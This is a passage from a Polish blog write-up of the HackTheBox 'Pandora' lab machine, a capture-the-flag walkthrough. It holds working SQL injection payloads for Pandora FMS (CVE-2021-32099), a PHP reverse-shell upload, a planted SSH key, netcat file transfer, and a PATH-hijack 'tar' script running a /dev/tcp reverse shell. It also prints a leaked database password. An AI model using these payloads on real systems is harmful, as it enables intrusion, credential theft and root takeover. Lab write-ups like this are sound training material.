<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://127.0.0.1/pandora_console/include/api.php?op=get&amp;op2=plugins&amp;return_type=csv&amp;other=;&amp;apipass=1234&amp;user=admin&amp;pass=pandora&#34;</span>
</code></pre></div><p>Po takim wywołaniu otrzymuję <code>auth error</code>, czyli API odpowiada.</p>
<hr>
<h2 id="chisel">Chisel<a hidden class="anchor" aria-hidden="true" href="#chisel">#</a></h2>
<p>Tutaj pomocne będzie narzędzie <a href="https://github.com/jpillora/chisel">Chisel</a>, które pozwoli na działanie na naszej przeglądarce mimo, że cała infrastruktura Pandory jest na wewnętrznej sieci maszyny.</p>
<p>Ustawiam serwer na moim Linuxie, który nasłuchuje na porcie 8001:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chisel server --reverse -p <span style="color:#ae81ff">8001</span>
</code></pre></div><p>Klienta ustawiam na Pandorze na użytkowniku <code>matt</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./chisel client 10.10.14.224:8001 R:8000:127.0.0.1:80
</code></pre></div><p>Czyli łączę się po <code>10.10.14.224</code> z moim Linuxem na porcie 8001, a następnie przekierowuję ruch na port <code>8000</code> a <code>127.0.0.1:80</code> to adres na który chcę się dostać.</p>
<p>I tym sposobem otrzymuję panel logowania. Teraz mogę przystąpić do prób łamania.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220131124732.png" alt=""  />
</p>
<p>Jak się okazuje, jest to wersja <code>v7.0NG.742_FIX_PERL2020</code>. Szybki research daje nadzieje na jakieś podatności.</p>
<p>Jest RCE, potrzebujemy jeszcze użytkownika i hasło
<a href="https://www.exploit-db.com/exploits/47898">https://www.exploit-db.com/exploits/47898</a></p>
<p>Próbowałem różnych kombinacji jeżeli chodzi o panel logowania, ale nic nie działało. Natomiast, gdy spróbowałem kombinację <code>daniel:HotelBabylon23</code>, którą użyliśmy do logowania na SSH, pojawił się inny komunikat.</p>
<p>Komunikat przy &ldquo;zwykłej&rdquo; kombinacji:
<img loading="lazy" src="../../../screenshots/Pasted%20image%2020220131135055.png" alt=""  />
</p>
<p>Komunikat po <code>daniel:HotelBabylon23</code>:
<img loading="lazy" src="../../../screenshots/Pasted%20image%2020220131135158.png" alt=""  />
</p>
<p>Ok, tutaj bardzo pomocny okazał się wpis na pewnym blogu.
<a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained</a></p>
<p>Największą luką w tej Pandorze jest  <code>SQL Injection (pre authentication) (CVE-2021-32099)</code> i po chwili researchu znalazłem z jakiegoś powodu usuniętego exploita na Githubie. Poradziłem sobie przez Google Cache.</p>
<p><a href="https://webcache.googleusercontent.com/search?q=cache:https://github.com/nikn0laty/CVE-2021-32099_exploit">https://webcache.googleusercontent.com/search?q=cache:https://github.com/nikn0laty/CVE-2021-32099_exploit</a></p>
<hr>
<h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/pandora<span style="color:#f92672">]</span>
└─$ curl -d <span style="color:#e6db74">&#34;session_id=666&#39; UNION SELECT 1,2,data FROM tsessions_php WHERE data LIKE &#39;%matt%&#39; -- xxx&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -H <span style="color:#e6db74">&#34;Cookie: PHPSESSID=mk92cuv4lllsta4b2stc4ak21k&#34;</span> -X POST http://127.0.0.1:8000/pandora_console/include/chart_generator.php
</code></pre></div><p>Odpowiedź:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">-</span><span style="color:#a6e22e">equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=utf-8&#34;</span> <span style="color:#f92672">/&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Pandora</span> <span style="color:#a6e22e">FMS</span> <span style="color:#a6e22e">Graph</span> ( <span style="color:#f92672">-</span> )<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;styles/pandora.css&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#f92672">/&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;styles/pandora_minimal.css&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#f92672">/&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;styles/js/jquery-ui.min.css&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#f92672">/&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;styles/js/jquery-ui_custom.css&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#f92672">/&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;text/javascript&#39;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;javascript/pandora.js&#39;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;text/javascript&#39;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;javascript/jquery-3.3.1.min.js&#39;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;text/javascript&#39;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;javascript/jquery.pandora.js&#39;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;text/javascript&#39;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;javascript/jquery-ui.min.js&#39;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.min.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.time.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.pie.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.crosshair.min.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.stack.min.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.selection.min.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.resize.min.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.threshold.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.threshold.multiple.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.symbol.min.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.exportdata.pandora.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/jquery.flot.axislabels.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;graphs/flot/pandora.flot.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span> <span style="color:#a6e22e">bgcolor</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#ffffff&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;background:#ffffff;&#39;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span><span style="color:#f92672">&gt;</span>
        <span style="color:#960050;background-color:#1e0010">$</span>(<span style="color:#e6db74">&#39;document&#39;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">ready</span>(<span style="color:#66d9ef">function</span> () {
            <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span> () {
                <span style="color:#66d9ef">try</span> {
                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">status</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">window</span><span style="color:#f92672">.</span><span style="color:#a6e22e">callPhantom</span>({ <span style="color:#a6e22e">status</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;loaded&#34;</span> });
                } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
                    <span style="color:#a6e22e">console</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;CALLBACK ERROR&#34;</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">.</span><span style="color:#a6e22e">message</span>)
                }
            }, <span style="color:#ae81ff">100</span>);
        });
    <span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>

</code></pre></div><p>Odpowiedź wskazuję na powodzenie exploitu, po wklejeniu id ciasteczka do przeglądarki <code>mk92cuv4lllsta4b2stc4ak21k</code>, otrzymałem zalogowany panel Pandory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Pandora FMS Graph <span style="color:#f92672">(</span> - <span style="color:#f92672">)</span>
</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220131142325.png" alt=""  />
</p>
<p><code>Pandora FMS v7.0NG.742_FIX_PERL2020 - Build PC200103 - MR 34</code></p>
<p>W tym momencie znalazłem kolejny link do Githuba z możliwością wykorzystania błędu z SQL Injection.</p>
<p><a href="https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py">https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py</a></p>
<p>Payload:
<code>http://127.0.0.1:8000/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:&quot;admin&quot;;' as data -- SgGO</code></p>
<p>I w tym momencie mamy dostęp do konta admina.
Próbowałem wrzucić reverse-shell.php bezpośrednio na serwer, ale modyfikując pewne parametry w <code>BurpSuite</code>, ale nic nie chciało zadziałać. Wspomogłem się filmikiem, na którym jest przedstawiony podobny problem. Tutaj użytkownik spakował shell.php do zipa i taki plik wrzucił na serwer. Ten przyjął zipa i wypakował go do ścieżki http://127.0.0.1:8000/pandora_console/extensions/
<a href="https://www.youtube.com/watch?v=KX_jZsdgsJE">https://www.youtube.com/watch?v=KX_jZsdgsJE</a></p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220201171728.png" alt=""  />
</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220202033141.png" alt=""  />
</p>
<p>Po uruchomieniu pliku na serwerze.
<img loading="lazy" src="../../../screenshots/Pasted%20image%2020220201172100.png" alt=""  />

Dostałem przekierowanie. W taki sposób otrzymałem shella na użytkowniku <code>matt</code>.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220201172031.png" alt=""  />
</p>
<p>user.txt
<code>3ad61bc0b475100ae5f2de64e3229de3</code></p>
<p>Wylistowałem również plik <code>config.php</code>, który wcześniej był niedostępny z nadzieją, że hasło, które się tutaj znajduje to również hasło na użytkownika <code>matt</code>, jednak tak nie było.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat config.php
&lt;?php
// File generated by centos kickstart
$config<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;dbtype&#34;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mysql&#34;</span>;
$config<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;dbname&#34;</span><span style="color:#f92672">]=</span><span style="color:#e6db74">&#34;pandora&#34;</span>;
$config<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;dbuser&#34;</span><span style="color:#f92672">]=</span><span style="color:#e6db74">&#34;pandora&#34;</span>;
$config<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;dbpass&#34;</span><span style="color:#f92672">]=</span><span style="color:#e6db74">&#34;PandoraFMSSecurePass2021&#34;</span>;
$config<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;dbhost&#34;</span><span style="color:#f92672">]=</span><span style="color:#e6db74">&#34;localhost&#34;</span>;
$config<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;homedir&#34;</span><span style="color:#f92672">]=</span><span style="color:#e6db74">&#34;/var/www/pandora/pandora_console&#34;</span>;
$config<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;homeurl&#34;</span><span style="color:#f92672">]=</span><span style="color:#e6db74">&#34;/pandora_console&#34;</span>;
error_reporting<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>; 
$ownDir <span style="color:#f92672">=</span> dirname<span style="color:#f92672">(</span>__FILE__<span style="color:#f92672">)</span> . <span style="color:#e6db74">&#39;/&#39;</span>;
include <span style="color:#f92672">(</span>$ownDir . <span style="color:#e6db74">&#34;config_process.php&#34;</span><span style="color:#f92672">)</span>;
?&gt;
</code></pre></div><hr>
<h1 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1>
<p>Po uruchomieniu skryptu <code>Linpeas</code> ponownie zauważyłem podejrzany SUID.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220201202837.png" alt=""  />
</p>
<h2 id="matt---ssh">matt - SSH<a hidden class="anchor" aria-hidden="true" href="#matt---ssh">#</a></h2>
<p>Niestety nie mogłem go uruchomić tak po prostu. Potrzebowałem bardziej stablinego shella np. poprzez SSH. Dodałem swój klucz publiczny SSH na maszynę na użytkownika <code>matt</code>, dzięki czemu mogłem dalej spokojnie pracować. Poniżej kod, którym to zrobiłem:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir .ssh
chmod <span style="color:#ae81ff">700</span> .ssh
cd .ssh
echo <span style="color:#e6db74">&#34;ssh-rsa PUBLIC KEY ...&#34;</span> &gt;&gt; authorized_keys
chmod <span style="color:#ae81ff">600</span> authorized_keys
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh matt@panda.htb
</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220202022457.png" alt=""  />
</p>
<p>Przesłałem sobie również plik <code>pandora_backup</code> poleceniem <code>netcat -l 1234 &gt; pandora</code>(u mnie) oraz <code>netcat -w 2 10.10.14.224 1234 &lt; pandora_backups</code> (na maszynie HTB). Przeanalizowałem plik poprzez <code>strings</code>.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220201224414.png" alt=""  />
</p>
<p>Widać, że program pakuje wszystkie pliki z folderu <code>pandora_console</code> do <code>.backup</code>. Na tym etapie próbowałem eskalacji poprzez tricki z wildcardem. Niestety nie udało mi się to, po dłuższym googlowaniu okazało się, że mogę wykorzystać zmienną <code>$PATH</code>.</p>
<hr>
<h2 id="path-privileges-escalation">$PATH Privileges Escalation<a hidden class="anchor" aria-hidden="true" href="#path-privileges-escalation">#</a></h2>
<p>Oryginalna zmienna $PATH jest taka:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</code></pre></div><p>I teraz skoro w skrypcie powyżej mamy <code>tar</code>,który jest wykonywany z uprawnieniami roota, możemy to wykorzystać tworząc swoją wersję binarki <code>tar</code>.</p>
<p>W folderze domowym stworzyłem plik <code>tar</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vim tar
<span style="color:#75715e">#!/bin/bash</span>
bash -i &gt;&amp; /dev/tcp/10.10.14.224/4444 0&gt;&amp;<span style="color:#ae81ff">1</span>
</code></pre></div><p>Następnie nadpisałem zmienną $PATH, dzięki czemu najpierw uruchomi się <code>tar</code> znajdujący się w lokalizacji <code>/home/matt</code> a nie <code>/usr/bin</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export PATH<span style="color:#f92672">=</span>/home/matt:$PATH
cat $PATH
/home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</code></pre></div><p>Teraz po uruchomieniu pliku:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">matt@pandora:/usr/bin$ ./pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client

</code></pre></div><p>Otrzymałem połączenie w drugim oknie.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220202030935.png" alt=""  />
</p>
<p>root.txt
<code>633258941d13876030f539c90c7322d0</code></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://suszczyk.github.io/tags/linux/">Linux</a></li>
      <li><a href="https://suszczyk.github.io/tags/easy/">Easy</a></li>
      <li><a href="https://suszczyk.github.io/tags/retired/">Retired</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://suszczyk.github.io/posts/hackthebox/meta/">
    <span class="title">« Prev Page</span>
    <br>
    <span>Meta - HackTheBox</span>
  </a>
  <a class="next" href="https://suszczyk.github.io/posts/hackthebox/shibboleth/">
    <span class="title">Next Page »</span>
    <br>
    <span>Shibboleth - HackTheBox</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pandora - HackTheBox on twitter"
        href="https://twitter.com/intent/tweet/?text=Pandora%20-%20HackTheBox&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fpandora%2f&amp;hashtags=Linux%2cEasy%2cRetired">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
